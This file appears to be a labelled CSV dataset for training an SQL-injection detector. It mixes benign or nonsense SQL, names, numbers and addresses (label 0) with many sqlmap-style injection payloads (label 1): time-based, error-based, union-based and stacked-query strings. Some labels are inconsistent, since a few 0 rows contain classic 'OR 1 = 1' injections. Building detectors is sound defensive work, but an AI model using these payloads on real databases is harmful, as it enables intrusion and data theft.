Query,Label
"  UPDATE personal SET tomorrow =  'whose', City =  'partly' WHERE cloud =  fun",0
SELECT danger ( s )  FROM dot FULL OUTER JOIN,0
SELECT ACOS ( 0.25 ) ;,0
"-4256'  )   where 9545  =  9545 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
SELECT * FROM crack,0
1 where 7299  =  7299 rlike sleep  (  5  )  --,1
"1%""   )    )     )   union all select null,null,null,null,null--",1
16340,0
"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1
"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'zpzf'  =  'zpzf",1
1' where 1557  =  1557,1
SELECT * FROM include WHERE strip = 'eager'  AND  ( flat = 'positive' OR fighting = 'drop' ) ,0
FROM  ( SELECT DISTINCT memory FROM track ) ,0
SELECT *,0
chamberlain@muevemiweb.al,0
SELECT * FROM forget WHERE compass = 'roof'  OR put = 'mother',0
1'||  (  select 'zyvk' from dual where 2072  =  2072,1
"-6305""   )    )     )   or 8097  =  2048 and    (    (     (  ""euyy"" like ""euyy",1
"iif  (  3204  =  8489,3204,1/0  )  ",1
SELECT * FROM express FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT COUNT ( general ) FROM carefully,0
 (  case when 2646  =  8520 then 2646 else null end  ) ,1
"-2864'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'vjbl'  =  'vjbl",1
"-9840   )    )    as thod where 4790  =  4790 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1""  )   where 9447  =  9447",1
SELECT AVG ( angle ) FROM lunch SELECT SUM ( trade ) ,0
mckearne,0
SELECT * FROM fall WHERE doctor NOT LIKE 'arrow%',0
"INSERT INTO die ( smallest, rice, measure, these, truth, distance )  VALUES  ( 'court', 'live'. five', 'boy', 'package', 'determine', 'seven' )  ",0
"1' in boolean mode  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  #",1
74725623a,0
"1 where 5382  =  5382 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT repeat ( s )  FROM tip UNION ALL,0
"SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 28313,28341 ) ",0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367532 ) ,0
"1'+  (  select oqvo where 7448  =  7448 union all select null,null,null,null,null--",1
1820,0
t0na5t44la,0
SELECT AVG ( medicine ) FROM fell SELECT SUM ( bean ) ,0
SELECT MIN ( loose )  AS arrow FROM these,0
"  SELECT * FROM pink WHERE good NOT IN  ( 'keep', 'parts', 'island' )  ",0
SELECT * FROM solve,0
"1""  )   as ybkp where 7788  =  7788 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
1  )   where 3030  =  3030,1
19461,0
"SELECT * FROM Users WHERE Name  = ""John Doe"" AND Pass  = ""myPass""",0
1 and 1  =  1,1
capella,0
remante,0
stanczak-kasem@movil-google.tj,0
ambiental,0
" select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1
"-7008'   )    )    union all select 9080,9080,9080#",1
SELECT MIN ( height )  AS lost FROM fair,0
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1
"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'usnh' like 'usnh",1
"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'nuil' like 'nuil",1
"1""  )   where 6843  =  6843 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1
"1  )   where 7571  =  7571 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT * FROM port WHERE goes NOT BETWEEN 'some' AND 'underline',0
"1""   )    )     )   union all select null,null,null,null,null,null,null--",1
96to3a38,0
"1%""   )    )     )   waitfor delay '0:0:5'--",1
"1'  )   where 6081  =  6081 union all select null,null,null,null,null,null,null,null,null--",1
bora,0
select   (  case when   (  8331  =  5625  )   then 8331 else 8331*  (  select 8331 from mysql.db  )   end  )  #,1
SELECT * FROM paper WHERE child IN  ( SELECT triangle FROM list ) ,0
"1'+  (  select hsef where 4136  =  4136 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",1
"1   )    )    as acni where 6355  =  6355 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
 (  select   (  case when   (  6035  =  9882  )   then 6035 else 6035*  (  select 6035 from mysql.db  )   end   )    ) ,1
SELECT * FROM wool WHERE protection  BETWEEN 10 AND 20,0
choon,0
SELECT COUNT ( growth ) FROM soil,0
1'  )   where 2974  =  2974 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
SELECT * FROM five WHERE Price NOT BETWEEN 10 AND 20,0
"avinguda carrilet, 21,",0
SELECT various ( s )  FROM article LEFT JOIN,0
abondadamente,0
"1   )    )    as atiy where 3855  =  3855 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
SELECT LN ( 1 ) ;,0
yalile,0
bollullos de la mitacin,0
SELECT Count ( * )  AS symbol,0
select   (  case when   (  5290  =  1720  )   then 5290 else 1/  (  select 0  )   end  )  --,1
mohandas,0
"INSERT INTO brass  ( eight, current, pull )  VALUES  ( 'mostly', 'held', 'without' )  ",0
SELECT * FROM more  WHERE exactly NOT LIKE '[teach]%',0
"1%'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   '%'  =  '",1
SELECT * FROM help FETCH FIRST 50 PERCENT ROWS ONLY,0
"-1475""  )   union all select 8611,8611,8611#",1
"-6463""   )    )     )   union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",1
SELECT laid FROM anything,0
SELECT TOP 3 * FROM become,0
SELECT * FROM keep 3,0
"  SELECT * FROM rhyme WHERE meal IN  ( 'tail', 'smooth', 'month' )  ",0
"  SELECT Orders.hairrID, Employees.farther, Employees.organization FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.vaporID ORDER BY Orders.horseID",0
"  UPDATE wash SET clothing =  'guess', City =  'monkey' WHERE nuts =  coming",0
"   SELECT Employees.nails, COUNT ( Orders.paragraphID )  AS soapFROM    ( OrdersINNER JOIN sometime ON Orders.rulerID  =  Employees.danceID ) ",0
SELECT option_value FROM wp_options WHERE option_name  =  'wpassetcleanup_settings' LIMIT 1,0
caca ihnen,0
1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,1
 and 1  =  0  )   union all,1
alcacil,0
"1%"" and 7533  =  7533 and ""%""  =  """,1
"   SELECT Employees.white, COUNT ( Orders.beforeID )  AS lakeFROM    ( OrdersINNER JOIN herd ON Orders.whistleID  =  Employees.climbID ) ",0
6922,0
1'||  (  select 'vvpn' from dual where 7011  =  7011 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||',1
61882626e,0
SELECT TOP 3 * FROM airplane SELECT * FROM natural 3SELECT * FROM doing,0
09352334m,0
"1""   )    )    as nlgn where 3834  =  3834 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1  )   as rlft where 1670  =  1670 waitfor delay '0:0:5'--,1
SELECT * FROM golden WHERE plus NOT BETWEEN 'sister' AND 'ship',0
"1,  (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4250  =  4250  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ",1
zahnley,0
" SELECT * FROM root ORDER BY electric ASC, remarkable DESC",0
79856305y,0
SELECT belt,0
22011041h,0
SELECT COUNT ( won )  FROM stick,0
"   SELECT consonant, noted, spendFROM in WHERE public  IS NOT NULL",0
"  SELECT TRUNCATE ( 345.156,   0 ) ;",0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""kndm""  =  ""kndm",1
agujer4e2o,0
"1""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
7205,0
"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  8529  =  8529",1
"1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'maln' like 'maln",1
SELECT * FROM salmon WHERE NOT sent = 'bare'  AND NOT saved = 'tin',0
sandberg@3horas.tl,0
"1'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'dhwt'  =  'dhwt",1
 UPDATE collect SET couple = 'battle'WHERE bigger = 'earth',0
SELECT * FROM porch FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM had 3,0
laga_rtijo,0
SELECT AVG ( Price ) FROM pure,0
40529,0
"1"" where 8727  =  8727",1
8.62453E+15,0
57879425v,0
"INSERT INTO steady  ( kitchen, far, source )  VALUES  ( 'bear', 'ride', 'provide' )  ",0
"1"" where 5477  =  5477",1
"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  # msrb",1
schouwen,0
blanquer,0
"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'zxrb'  =  'zxrb",1
SELECT * FROM hollow,0
"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"   SELECT Employees.individual, COUNT ( Orders.sourceID )  AS lionFROM    ( OrdersINNER JOIN coal ON Orders.giantID  =  Employees.chiefID ) ",0
saiz,0
reilly-pidgeon@interpretacion-diccionario-y-significado-de-los-s,0
SELECT * FROM arrangement WHERE earlier  BETWEEN 10 AND 20,0
SELECT numeral ( s )  FROM somewhere SELECT work FROM box,0
SELECT CEILING ( 25 ) ;,0
trixy,0
"  SELECT affect AS contain, draw AS [common]  FROM yesterday",0
SELECT * FROM specific  WHERE explore NOT LIKE '[cool]%',0
SELECT * FROM Users WHERE UserId  =  105 OR 1 = 1;,0
SELECT TOP 3 * FROM plus WHERE next = 'aside' SELECT * FROM create,0
8.88987E+15,0
catalda,0
"1'||  (  select 'scqw' where 3337  =  3337 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
coppin@sexl.no,0
"1'   )    )     )   union all select null,null#",1
SELECT COUNT ( DISTINCT recent )  FROM mysterious,0
SELECT entire ( s )  FROM completely LEFT JOIN,0
"  SELECT TIMEDIFF ( ""13:10:11"", ""13:10:10"" ) ;",0
i77ovar,0
"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",1
"1%""  )   union all select null,null,null,null#",1
"1""  )   as dien where 4022  =  4022",1
1   )    )    as mcyh where 1001  =  1001,1
SELECT massage ( s ) FROM imagine INNER JOIN,0
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",1
"plza. mariano arregui canela 171,",0
"1""  )   where 9680  =  9680 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
or   (  EXISTS  ) ,1
romer@pisossantcugat.iq,0
SELECT * FROM advice,0
DELETE FROM difference,0
"-2982' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'iqwn'  =  'iqwn",1
SELECT COUNT ( DISTINCT yes )  FROM guide,0
"-3933%""   )    )    or elt  (  8142  =  2978,2978  )   and    (    (   ""%""  =  """,1
carlin,0
talavera panfili,0
1.52349E+15,0
-1217'   )    )     )   order by 1#,1
"   SELECT automobile,balance,younger,substance,blank     (  (  material JOIN leader ON president.clock =  strike.captured )   INNER JOIN olderON Orders.horn =  meal.graphID ) ",0
SELECT TOP 50 PERCENT * FROM pure,0
"manzano, el",0
SELECT * FROM Products WHERE ProductName BETWEEN 'Carnarvon Tigers' AND 'Mozzarella di Giovanni' ORDER BY ProductName;,0
cea,0
SELECT AVG ( dot ) FROM planning SELECT SUM ( so ) ,0
valladolid,0
SELECT * FROM variety  WHERE law = cross,0
"1   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   4348  =  4348",1
SELECT continent ( s ) FROM ice INNER JOIN,0
SELECT * FROM foreign,0
SELECT joy ( s )  FROM willing FULL OUTER JOIN,0
SELECT * FROM exchange,0
SELECT * FROM guess WHERE reach BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM hidden WHERE doubt = 'fun'  AND City = 'furniture',0
1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,1
SELECT 18 MOD 4;,0
3.88E+15,0
SELECT City FROM Suppliers ORDER BY City;,0
"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'lbwh'  =  'lbwh",1
"  SELECT TIME_TO_SEC ( ""00:00:05"" ) ;",0
"  SELECT LEAST ( 3, 12, 34, 8, 25 ) ;",0
create user name identified by 'pass123',1
1'+  (  select rdwb where 2498  =  2498 and 3429  =  7639--,1
"iif  (  5214  =  7412,1,1/0  )  ",1
"-7060'  )   or make_set  (  4233  =  1689,1689  )   and   (  'twpr' like 'twpr",1
SELECT * FROM think WHERE consist = 'face',0
"1""  )   as eefe where 5290  =  5290 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
"1 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM rocky WHERE    NOT sense = 'escape',0
"   SELECT poet, missing, common FROM reason WHERE doing  IS NULL",0
"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'wgpg' like 'wgpg",1
basset ramos,0
kenji,0
SELECT AVG ( Price ) FROM detail,0
"  SELECT primitiveID AS ID, sign AS respect FROM happy",0
"1   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'pufu' like 'pufu",1
1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  9505  =  9505,1
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'ixzr'  =  'ixzr,1
shanta,0
SELECT * FROM right FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM grow,0
"-4669"" or 8571  =  8571--",1
"1' where 9605  =  9605 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
"1%""   )    )     )   and 9198  =  9198--",1
4170,0
SELECT COUNT ( ourselves ) FROM saw,0
"1'||  (  select 'lpej' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",1
SELECT AVG ( tired ) FROM worker SELECT SUM ( rocket ) ,0
1' where 2913  =  2913 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1
chrysa2,0
 UPDATE serve SET official = 'colony'WHERE labor = 'dark',0
1'   )    )    as tlsl where 8467  =  8467,1
"1   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"INSERT INTO stronger  ( coming, still, correctly )  VALUES  ( 'jack', 'worse', 'egg' )  ",0
SELECT COUNT ( anyone ) FROM thy,0
ficker,0
hengevel,0
"1"" rlike sleep  (  5  )  ",1
SELECT * FROM  ( SELECT mind FROM supply ) ,0
SELECT * FROM by WHERE quickly = 'pain' LIMIT 3,0
"1'+  (  select mems where 5091  =  5091 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  +'",1
cuevas de san marcos,0
4228,0
"1'+  (  select 'zkum' where 5161  =  5161 union all select null,null,null,null#",1
SELECT column_name FROM table1 FULL OUTER JOIN table2 ON table1.column_name  =  table2.column_name WHERE condition ;,0
-8809'||  (  select 'hyzr' where 5694  =  5694 union all select 5694--,1
torre-cardela,0
1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',1
SELECT * FROM however ORDER BY driving DESC,0
-9541 where 4291  =  4291 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
45738,0
"1""  )   as vcvw where 2445  =  2445 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1
SELECT * FROM serve WHERE been NOT LIKE 'development%',0
SELECT * FROM grabbed WHERE mass = 'pictured' FETCH FIRST 3 ROWS ONLY,0
"  SELECT POW ( 4, 2 ) ;",0
SELECT * FROM sky WHERE light BETWEEN '1996-07-01' AND '1996-07-31',0
18129,0
38350,0
SELECT easily ( s )  FROM earn UNION ALL,0
"1   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   9333  =  9333",1
"  SELECT yourself AS hay, pan AS [speech]  FROM determine",0
thibaut,0
1'   )    )    as dipp where 1714  =  1714,1
"  SELECT dropped AS right, common AS [accident]  FROM art",0
SELECT TOP 3 * FROM ought WHERE brain = 'birthday' SELECT * FROM major,0
"1""  )   as qmtx where 5280  =  5280 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
noami,0
"1""   )    )    union all select null,null,null,null,null,null,null,null#",1
eliseo,0
"1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT * FROM make FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM magic,0
"-1684""   )    )     )   union all select 7473,7473#",1
-2658  )   as casi where 7364  =  7364 or 8245  =  9651--,1
voglis@hiperxxx.au,0
"1  )   as caoa where 6139  =  6139 union all select null,null,null,null,null,null,null,null--",1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'btnl'  =  'btnl",1
DELETE FROM half,0
sile,0
steele,0
"  SELECT Orders.hiddenrID, Employees.bone, Employees.safe FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.planID ORDER BY Orders.frequentlyID",0
casas de miravete,0
SELECT * FROM specific WHERE story = 'tax'  AND City = 'expect',0
"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",1
28760,0
4458,0
-2039'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1
1%'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  ',1
SELECT silence FROM caught UNION SELECT upward FROM except ORDER BY one,0
" SELECT column_name ( s )  FROM sometime,paper",0
SELECT COUNT ( funny )  FROM understanding,0
select * from users where id  =  1.<@$ or 1  =  1 -- 1,1
tenna1,0
49212,0
"buidaoli, 49, 12-g",0
"1'  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1""  )   as obbk where 6414  =  6414 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
SELECT AVG ( wrote )  FROM composition  SELECT SUM ( wore ) ,0
1.27984E+15,0
"SELECT term_id, meta_key, meta_value FROM wp_termmeta WHERE term_id IN  ( 2712,3146,3152,2720,3078,2766,2679 )  ORDER BY meta_id ASC",0
SELECT TOP 50 PERCENT * FROM position,0
"   SELECT COUNT ( them ) , solid FROM card BY author",0
"1'+  (  select yfuu where 1717  =  1717 union all select null,null,null,null,null,null,null,null,null--",1
49626,0
schiavelli@buscadordevideos.mk,0
" SELECT * FROM section ORDER BY wing, himself",0
leonella,0
DELETE FROM exercise,0
"1""   )    )    as lslk where 6729  =  6729 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
" select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",1
"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1
"   SELECT city,four,spirit,temperature,jump     (  (  occur JOIN stepped ON occasionally.over =  till.compare )   INNER JOIN oppositeON Orders.manner =  disappear.afternoonID ) ",0
"  SELECT circle,father,us FROM avoid LEFT JOIN Orders ON different.representID =  spoken.putting ORDER BY chance.rice",0
"  SELECT hospital AS double, saved AS [desk]  FROM musical",0
"1%""   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT owner FROM flies UNION SELECT circus FROM onto ORDER BY collect,0
SELECT trick FROM fear UNION ALL SELECT tall FROM science ORDER BY spread,0
"1' union all select null,null#",1
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1
SELECT COUNT ( smoke ) FROM enter,0
4631,0
end and    (    (   'vkle'  =  'vkle,1
1'+  (  select smze where 5616  =  5616,1
SELECT CAST ( 5-10 AS SIGNED ) ;,0
SELECT apartment ( s )  FROM plenty UNION ALL,0
"1  )   as zqxa where 5718  =  5718 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"-9891"" union all select 7489#",1
